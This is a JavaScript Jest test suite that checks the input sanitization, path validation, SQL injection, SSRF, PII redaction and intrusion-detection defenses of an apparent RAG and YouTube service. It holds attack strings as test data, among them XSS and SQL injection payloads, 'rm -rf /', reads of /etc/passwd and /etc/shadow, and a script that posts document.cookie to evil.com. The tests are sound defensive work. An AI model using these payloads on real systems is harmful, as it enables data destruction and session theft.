const crypto = require('crypto');
const path = require('path');
const fs = require('fs').promises;
const { DatabaseService } = require('../../../src/services/database');
const { RAGService } = require('../../../src/services/rag');
const { YouTubeService } = require('../../../src/services/youtube');

describe('Security Validation Tests', () => {
  let databaseService;
  let ragService;
  let youtubeService;

  beforeAll(async () => {
    // Initialize services with test configurations
    databaseService = new DatabaseService({ 
      dbPath: ':memory:',
      securityMode: true
    });
    await databaseService.initialize();
    
    ragService = new RAGService({
      databaseService,
      testMode: true,
      securityValidation: true
    });
    
    youtubeService = new YouTubeService({
      databaseService,
      testMode: true,
      securityMode: true
    });
  });

  afterAll(async () => {
    if (databaseService) {
      await databaseService.close();
    }
  });

  describe('Input Validation & Sanitization', () => {
    test('should sanitize HTML and script injection attempts', async () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload="alert(1)">',
        '&lt;script&gt;alert("encoded")&lt;/script&gt;',
        "'; DROP TABLE documents; --",
        '<style>@import"javascript:alert(1)"</style>'
      ];
      
      for (const maliciousInput of maliciousInputs) {
        const sanitized = ragService.sanitizeInput(maliciousInput);
        
        // Should not contain dangerous tags or scripts
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('onload=');
        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized).not.toContain('@import');
        
        // Should preserve safe content
        if (maliciousInput.includes('XSS') && !maliciousInput.includes('<')) {
          expect(sanitized).toContain('XSS');
        }
      }
    });

    test('should validate and sanitize file paths', async () => {
      const dangerousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM',
        '../../../../../../../../etc/passwd%00',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam',
        '\\\\server\\share\\file.txt',
        '/proc/self/environ',
        'CON', 'PRN', 'AUX', 'NUL' // Windows reserved names
      ];
      
      for (const dangerousPath of dangerousPaths) {
        await expect(ragService.validateFilePath(dangerousPath))
          .rejects.toThrow(/Invalid file path|Security violation|Path traversal/);
      }
      
      // Valid paths should pass
      const validPaths = [
        'documents/file.pdf',
        'projects/my-project/data.json',
        'cache/embeddings/vectors.bin'
      ];
      
      for (const validPath of validPaths) {
        const validated = await ragService.validateFilePath(validPath);
        expect(validated).toBeDefined();
        expect(validated).not.toContain('..');
      }
    });

    test('should validate document content size and type', async () => {
      // Test oversized content
      const oversizedDocument = {
        id: 'oversized-doc',
        title: 'Oversized Document',
        content: 'A'.repeat(10 * 1024 * 1024), // 10MB
        metadata: {}
      };
      
      await expect(ragService.indexDocument(oversizedDocument))
        .rejects.toThrow(/Document too large|Size limit exceeded/);
      
      // Test invalid content types
      const invalidDocuments = [
        {
          id: 'binary-doc',
          content: Buffer.from([0x00, 0x01, 0x02, 0x03]).toString('binary'),
          metadata: {}
        },
        {
          id: 'null-doc',
          content: null,
          metadata: {}
        },
        {
          id: 'undefined-doc',
          content: undefined,
          metadata: {}
        }
      ];
      
      for (const invalidDoc of invalidDocuments) {
        await expect(ragService.indexDocument(invalidDoc))
          .rejects.toThrow(/Invalid content|Content validation failed/);
      }
    });

    test('should validate YouTube URLs and channel IDs', async () => {
      const maliciousURLs = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert(1)</script>',
        'file:///etc/passwd',
        'ftp://malicious.com/file.exe',
        'http://malicious.com/redirect?url=javascript:alert(1)',
        'https://youtube.com@malicious.com',
        'https://youtube.com\\@malicious.com'
      ];
      
      for (const maliciousURL of maliciousURLs) {
        await expect(youtubeService.validateChannelURL(maliciousURL))
          .rejects.toThrow(/Invalid URL|Security violation|Invalid channel/);
      }
      
      // Valid YouTube URLs should pass
      const validURLs = [
        'https://www.youtube.com/@TestChannel',
        'https://youtube.com/channel/UCTestChannelId',
        'https://www.youtube.com/c/TestChannel'
      ];
      
      for (const validURL of validURLs) {
        const result = await youtubeService.validateChannelURL(validURL);
        expect(result).toBeDefined();
        expect(result.isValid).toBe(true);
      }
    });
  });

  describe('SQL Injection Protection', () => {
    test('should prevent SQL injection in search queries', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE documents; --",
        "' OR '1'='1",
        "1; DELETE FROM documents WHERE 1=1; --",
        "'; INSERT INTO documents VALUES ('malicious'); --",
        "' UNION SELECT password FROM users --",
        "1' AND (SELECT COUNT(*) FROM documents) > 0 --",
        "'; EXEC xp_cmdshell('format C:'); --"
      ];
      
      for (const injection of sqlInjectionAttempts) {
        try {
          const results = await databaseService.searchDocuments(injection);
          
          // If the query doesn't throw an error, verify it was safely handled
          expect(Array.isArray(results)).toBe(true);
          
          // Verify database integrity (documents table should still exist)
          const tableCheck = await databaseService.query('SELECT name FROM sqlite_master WHERE type="table" AND name="documents"');
          expect(tableCheck.length).toBe(1);
          
        } catch (error) {
          // Errors are acceptable as long as they're not SQL syntax errors
          expect(error.message).not.toContain('syntax error');
          expect(error.message).not.toContain('near');
        }
      }
    });

    test('should use parameterized queries for all database operations', async () => {
      const testDocument = {
        id: "test'; DROP TABLE documents; --",
        title: "Title with 'quotes' and \"double quotes\"",
        content: "Content with SQL keywords: SELECT, INSERT, UPDATE, DELETE",
        metadata: JSON.stringify({ 
          malicious: "'; DROP TABLE metadata; --",
          safe: "normal value"
        })
      };
      
      // Document should be safely inserted
      const result = await databaseService.saveDocument(testDocument);
      expect(result).toEqual(testDocument);
      
      // Verify document was stored with exact values (not interpreted as SQL)
      const retrieved = await databaseService.getDocument(testDocument.id);
      expect(retrieved.id).toBe(testDocument.id);
      expect(retrieved.title).toBe(testDocument.title);
      expect(retrieved.content).toBe(testDocument.content);
      
      // Verify database structure is intact
      const tables = await databaseService.query('SELECT name FROM sqlite_master WHERE type="table"');
      const tableNames = tables.map(t => t.name);
      expect(tableNames).toContain('documents');
    });
  });

  describe('Data Encryption & Protection', () => {
    test('should encrypt sensitive data at rest', async () => {
      const sensitiveDocument = {
        id: 'sensitive-doc',
        title: 'Confidential Information',
        content: 'This document contains sensitive information that should be encrypted.',
        metadata: {
          classification: 'confidential',
          containsPII: true
        }
      };
      
      // Enable encryption for this document
      const encryptedResult = await ragService.indexDocument(sensitiveDocument, {
        encryption: true,
        encryptionKey: 'test-encryption-key'
      });
      
      expect(encryptedResult.encrypted).toBe(true);
      
      // Verify data is encrypted in storage
      const storedData = await databaseService.getDocumentRaw(sensitiveDocument.id);
      expect(storedData.content).not.toBe(sensitiveDocument.content);
      expect(storedData.content).toMatch(/^[a-f0-9]+$/); // Encrypted hex string
      
      // Verify data can be decrypted with correct key
      const decryptedDocument = await ragService.getDocument(sensitiveDocument.id, {
        encryptionKey: 'test-encryption-key'
      });
      
      expect(decryptedDocument.content).toBe(sensitiveDocument.content);
      
      // Verify data cannot be decrypted with wrong key
      await expect(ragService.getDocument(sensitiveDocument.id, {
        encryptionKey: 'wrong-key'
      })).rejects.toThrow(/Decryption failed|Invalid key/);
    });

    test('should securely handle API keys and credentials', () => {
      // API keys should not be stored in plain text
      const mockAPIKey = 'sk-test1234567890abcdef';
      
      const hashedKey = ragService.hashAPIKey(mockAPIKey);
      
      expect(hashedKey).not.toBe(mockAPIKey);
      expect(hashedKey.length).toBeGreaterThan(mockAPIKey.length);
      expect(hashedKey).toMatch(/^[a-f0-9]+$/); // Should be hex hash
      
      // Same key should produce same hash
      const hashedKey2 = ragService.hashAPIKey(mockAPIKey);
      expect(hashedKey).toBe(hashedKey2);
      
      // Different keys should produce different hashes
      const differentKey = 'sk-different1234567890';
      const hashedDifferentKey = ragService.hashAPIKey(differentKey);
      expect(hashedDifferentKey).not.toBe(hashedKey);
    });

    test('should implement secure random token generation', () => {
      const tokenLength = 32;
      const tokens = [];
      
      // Generate multiple tokens
      for (let i = 0; i < 10; i++) {
        const token = ragService.generateSecureToken(tokenLength);
        
        expect(token).toBeDefined();
        expect(token.length).toBe(tokenLength * 2); // Hex encoding doubles length
        expect(token).toMatch(/^[a-f0-9]+$/); // Should be hex
        expect(tokens.includes(token)).toBe(false); // Should be unique
        
        tokens.push(token);
      }
      
      // Verify cryptographic randomness (basic statistical test)
      const tokenBuffer = Buffer.from(tokens.join(''), 'hex');
      const entropy = calculateShannonEntropy(tokenBuffer);
      expect(entropy).toBeGreaterThan(7.0); // High entropy indicates good randomness
    });
  });

  describe('Access Control & Authorization', () => {
    test('should validate user permissions for operations', async () => {
      const userContexts = {
        admin: { role: 'admin', permissions: ['read', 'write', 'delete', 'admin'] },
        editor: { role: 'editor', permissions: ['read', 'write'] },
        viewer: { role: 'viewer', permissions: ['read'] },
        guest: { role: 'guest', permissions: [] }
      };
      
      const testDocument = {
        id: 'permission-test-doc',
        title: 'Permission Test Document',
        content: 'This document tests permission controls.'
      };
      
      // Admin should be able to perform all operations
      await expect(ragService.indexDocument(testDocument, { userContext: userContexts.admin }))
        .resolves.toBeDefined();
      
      await expect(ragService.getDocument(testDocument.id, { userContext: userContexts.admin }))
        .resolves.toBeDefined();
      
      await expect(ragService.deleteDocument(testDocument.id, { userContext: userContexts.admin }))
        .resolves.toBe(true);
      
      // Re-create document for other tests
      await ragService.indexDocument(testDocument, { userContext: userContexts.admin });
      
      // Editor should be able to read and write but not delete
      await expect(ragService.getDocument(testDocument.id, { userContext: userContexts.editor }))
        .resolves.toBeDefined();
      
      await expect(ragService.updateDocument(testDocument.id, { title: 'Updated' }, { userContext: userContexts.editor }))
        .resolves.toBeDefined();
      
      await expect(ragService.deleteDocument(testDocument.id, { userContext: userContexts.editor }))
        .rejects.toThrow(/Insufficient permissions|Access denied/);
      
      // Viewer should only be able to read
      await expect(ragService.getDocument(testDocument.id, { userContext: userContexts.viewer }))
        .resolves.toBeDefined();
      
      await expect(ragService.updateDocument(testDocument.id, { title: 'Unauthorized Update' }, { userContext: userContexts.viewer }))
        .rejects.toThrow(/Insufficient permissions|Access denied/);
      
      // Guest should not be able to perform any operations
      await expect(ragService.getDocument(testDocument.id, { userContext: userContexts.guest }))
        .rejects.toThrow(/Insufficient permissions|Access denied/);
    });

    test('should implement rate limiting for API calls', async () => {
      const rateLimiter = ragService.createRateLimiter({
        windowMs: 1000, // 1 second
        maxRequests: 5   // 5 requests per second
      });
      
      const testQuery = 'rate limit test query';
      const requests = [];
      
      // Make requests within limit
      for (let i = 0; i < 5; i++) {
        requests.push(ragService.query(testQuery, { rateLimiter }));
      }
      
      const results = await Promise.all(requests);
      expect(results).toHaveLength(5);
      
      // Next request should be rate limited
      await expect(ragService.query(testQuery, { rateLimiter }))
        .rejects.toThrow(/Rate limit exceeded|Too many requests/);
      
      // After waiting, requests should work again
      await new Promise(resolve => setTimeout(resolve, 1100)); // Wait for window to reset
      
      await expect(ragService.query(testQuery, { rateLimiter }))
        .resolves.toBeDefined();
    });

    test('should log security events for auditing', async () => {
      const securityEvents = [];
      const mockLogger = {
        logSecurityEvent: (event) => securityEvents.push(event)
      };
      
      ragService.setSecurityLogger(mockLogger);
      
      // Trigger various security events
      try {
        await ragService.query('<script>alert(1)</script>');
      } catch (error) {
        // Expected to fail
      }
      
      try {
        await ragService.validateFilePath('../../../etc/passwd');
      } catch (error) {
        // Expected to fail
      }
      
      try {
        await databaseService.searchDocuments("'; DROP TABLE documents; --");
      } catch (error) {
        // May or may not fail, but should log
      }
      
      // Verify security events were logged
      expect(securityEvents.length).toBeGreaterThan(0);
      
      const eventTypes = securityEvents.map(event => event.type);
      expect(eventTypes).toContain('xss_attempt');
      expect(eventTypes).toContain('path_traversal_attempt');
      
      // Verify event structure
      securityEvents.forEach(event => {
        expect(event).toHaveProperty('timestamp');
        expect(event).toHaveProperty('type');
        expect(event).toHaveProperty('description');
        expect(event).toHaveProperty('severity');
        expect(['low', 'medium', 'high', 'critical']).toContain(event.severity);
      });
    });
  });

  describe('Network Security', () => {
    test('should validate SSL/TLS certificates', async () => {
      const testURLs = [
        'https://www.youtube.com', // Valid certificate
        'https://expired.badssl.com', // Expired certificate
        'https://self-signed.badssl.com', // Self-signed certificate
        'https://untrusted-root.badssl.com' // Untrusted root
      ];
      
      for (const url of testURLs) {
        try {
          const isValid = await ragService.validateSSLCertificate(url);
          
          if (url.includes('badssl.com')) {
            expect(isValid).toBe(false);
          } else {
            expect(isValid).toBe(true);
          }
        } catch (error) {
          // Certificate validation failures are acceptable for bad certificates
          if (url.includes('badssl.com')) {
            expect(error.message).toMatch(/certificate|SSL|TLS/);
          } else {
            throw error; // Valid URLs should not throw
          }
        }
      }
    });

    test('should prevent SSRF attacks', async () => {
      const maliciousURLs = [
        'http://localhost:22', // SSH port
        'http://127.0.0.1:3306', // MySQL port
        'http://169.254.169.254/metadata', // AWS metadata
        'http://[::1]:22', // IPv6 localhost
        'http://0.0.0.0:80', // All interfaces
        'file:///etc/passwd', // File protocol
        'ftp://internal.server/file.txt' // FTP protocol
      ];
      
      for (const maliciousURL of maliciousURLs) {
        await expect(youtubeService.fetchURL(maliciousURL))
          .rejects.toThrow(/SSRF protection|Invalid URL|Protocol not allowed/);
      }
      
      // Valid external URLs should work
      const validURL = 'https://www.youtube.com/robots.txt';
      await expect(youtubeService.fetchURL(validURL))
        .resolves.toBeDefined();
    });

    test('should implement proper CORS handling', () => {
      const corsPolicy = ragService.getCORSPolicy();
      
      expect(corsPolicy).toBeDefined();
      expect(corsPolicy.origin).toBeDefined();
      expect(corsPolicy.methods).toContain('GET');
      expect(corsPolicy.methods).toContain('POST');
      expect(corsPolicy.methods).not.toContain('TRACE'); // Dangerous method
      expect(corsPolicy.credentials).toBe(false); // Should not allow credentials by default
      
      // Headers should not expose sensitive information
      const allowedHeaders = corsPolicy.allowedHeaders || [];
      expect(allowedHeaders).not.toContain('Authorization'); // Unless specifically configured
      expect(allowedHeaders).not.toContain('Cookie');
    });
  });

  describe('Data Privacy & Compliance', () => {
    test('should handle PII detection and protection', async () => {
      const documentsWithPII = [
        {
          id: 'pii-test-1',
          content: 'Contact John Doe at john.doe@example.com or call 555-123-4567',
          metadata: {}
        },
        {
          id: 'pii-test-2',
          content: 'SSN: 123-45-6789, Credit Card: 4532-1234-5678-9012',
          metadata: {}
        },
        {
          id: 'pii-test-3',
          content: 'Address: 123 Main St, Anytown, ST 12345',
          metadata: {}
        }
      ];
      
      for (const doc of documentsWithPII) {
        const result = await ragService.indexDocument(doc, { detectPII: true });
        
        expect(result.piiDetected).toBe(true);
        expect(result.piiTypes).toBeDefined();
        expect(Array.isArray(result.piiTypes)).toBe(true);
        
        // Content should be sanitized or redacted
        const storedDoc = await databaseService.getDocument(doc.id);
        
        if (doc.content.includes('@')) {
          expect(result.piiTypes).toContain('email');
          expect(storedDoc.content).not.toContain('@example.com'); // Should be redacted
        }
        
        if (doc.content.includes('555-')) {
          expect(result.piiTypes).toContain('phone');
          expect(storedDoc.content).not.toContain('555-123-4567'); // Should be redacted
        }
        
        if (doc.content.includes('SSN:')) {
          expect(result.piiTypes).toContain('ssn');
          expect(storedDoc.content).not.toContain('123-45-6789'); // Should be redacted
        }
      }
    });

    test('should implement data retention policies', async () => {
      const testDocument = {
        id: 'retention-test-doc',
        title: 'Document with Retention Policy',
        content: 'This document should be automatically deleted after retention period.',
        metadata: {
          retentionPolicy: {
            days: 1, // 1 day for testing
            autoDelete: true
          }
        }
      };
      
      await ragService.indexDocument(testDocument);
      
      // Document should exist initially
      const initialDoc = await databaseService.getDocument(testDocument.id);
      expect(initialDoc).toBeDefined();
      
      // Simulate passage of time by updating document timestamp
      const twoDaysAgo = new Date(Date.now() - 2 * 24 * 60 * 60 * 1000);
      await databaseService.updateDocumentTimestamp(testDocument.id, twoDaysAgo);
      
      // Run retention cleanup
      const cleanupResults = await ragService.runRetentionCleanup();
      expect(cleanupResults.deletedCount).toBeGreaterThan(0);
      expect(cleanupResults.deletedDocuments).toContain(testDocument.id);
      
      // Document should be deleted
      const deletedDoc = await databaseService.getDocument(testDocument.id);
      expect(deletedDoc).toBeNull();
    });

    test('should provide data export functionality for GDPR compliance', async () => {
      const userDocuments = [
        {
          id: 'user-doc-1',
          title: 'User Document 1',
          content: 'Content for user document 1',
          metadata: { userId: 'test-user-123', category: 'personal' }
        },
        {
          id: 'user-doc-2',
          title: 'User Document 2',
          content: 'Content for user document 2',
          metadata: { userId: 'test-user-123', category: 'work' }
        }
      ];
      
      // Index documents for a user
      for (const doc of userDocuments) {
        await ragService.indexDocument(doc);
      }
      
      // Export user data
      const exportData = await ragService.exportUserData('test-user-123');
      
      expect(exportData).toBeDefined();
      expect(exportData.userId).toBe('test-user-123');
      expect(exportData.exportDate).toBeDefined();
      expect(exportData.documents).toHaveLength(2);
      
      // Verify exported documents contain all user data
      exportData.documents.forEach(doc => {
        expect(doc.metadata.userId).toBe('test-user-123');
        expect(['personal', 'work']).toContain(doc.metadata.category);
      });
      
      // Export should be in structured format
      expect(exportData.format).toBe('JSON');
      expect(exportData.version).toBeDefined();
    });
  });

  describe('System Security Monitoring', () => {
    test('should detect and respond to suspicious activity', async () => {
      const suspiciousActivities = [];
      const alertHandler = (alert) => suspiciousActivities.push(alert);
      
      ragService.setSecurityAlertHandler(alertHandler);
      
      // Simulate suspicious activities
      const suspiciousPatterns = [
        // Multiple failed attempts
        async () => {
          for (let i = 0; i < 10; i++) {
            try {
              await ragService.query(`malicious query ${i}`, { userContext: { role: 'invalid' } });
            } catch (error) {
              // Expected to fail
            }
          }
        },
        
        // Rapid-fire requests from same source
        async () => {
          const promises = [];
          for (let i = 0; i < 50; i++) {
            promises.push(ragService.query(`rapid query ${i}`, { sourceIP: '192.168.1.100' }));
          }
          await Promise.allSettled(promises);
        },
        
        // Large query attempts
        async () => {
          const largeQuery = 'A'.repeat(10000);
          try {
            await ragService.query(largeQuery);
          } catch (error) {
            // Expected to fail
          }
        }
      ];
      
      for (const pattern of suspiciousPatterns) {
        await pattern();
        await new Promise(resolve => setTimeout(resolve, 100)); // Small delay
      }
      
      // Wait for alerts to be processed
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      expect(suspiciousActivities.length).toBeGreaterThan(0);
      
      const alertTypes = suspiciousActivities.map(alert => alert.type);
      expect(alertTypes).toContain('repeated_failures');
      expect(alertTypes).toContain('rate_limit_exceeded');
      
      // Verify alert structure
      suspiciousActivities.forEach(alert => {
        expect(alert).toHaveProperty('timestamp');
        expect(alert).toHaveProperty('type');
        expect(alert).toHaveProperty('severity');
        expect(alert).toHaveProperty('description');
        expect(['low', 'medium', 'high', 'critical']).toContain(alert.severity);
      });
    });

    test('should implement intrusion detection capabilities', async () => {
      const intrusionAttempts = [
        {
          type: 'directory_traversal',
          payload: '../../../etc/passwd'
        },
        {
          type: 'command_injection',
          payload: 'test; rm -rf /'
        },
        {
          type: 'xss_injection',
          payload: '<script>fetch(\'http://evil.com\',{method:\'POST\',body:document.cookie})</script>'
        },
        {
          type: 'sql_injection',
          payload: "1' UNION SELECT username,password FROM users--"
        }
      ];
      
      const detectedIntrusions = [];
      ragService.setIntrusionDetectionHandler((intrusion) => {
        detectedIntrusions.push(intrusion);
      });
      
      for (const attempt of intrusionAttempts) {
        try {
          await ragService.processInput(attempt.payload, { 
            intrusionDetection: true,
            sourceInfo: { type: attempt.type }
          });
        } catch (error) {
          // Intrusion attempts should be blocked
          expect(error.message).toMatch(/blocked|detected|security/);
        }
      }
      
      expect(detectedIntrusions.length).toBe(intrusionAttempts.length);
      
      detectedIntrusions.forEach((intrusion, index) => {
        expect(intrusion.type).toBe(intrusionAttempts[index].type);
        expect(intrusion.blocked).toBe(true);
        expect(intrusion.timestamp).toBeDefined();
        expect(intrusion.payload).toBe(intrusionAttempts[index].payload);
      });
    });
  });
});

// Utility function to calculate Shannon entropy
function calculateShannonEntropy(buffer) {
  const frequency = new Map();
  
  for (const byte of buffer) {
    frequency.set(byte, (frequency.get(byte) || 0) + 1);
  }
  
  let entropy = 0;
  const length = buffer.length;
  
  for (const count of frequency.values()) {
    const probability = count / length;
    entropy -= probability * Math.log2(probability);
  }
  
  return entropy;
}
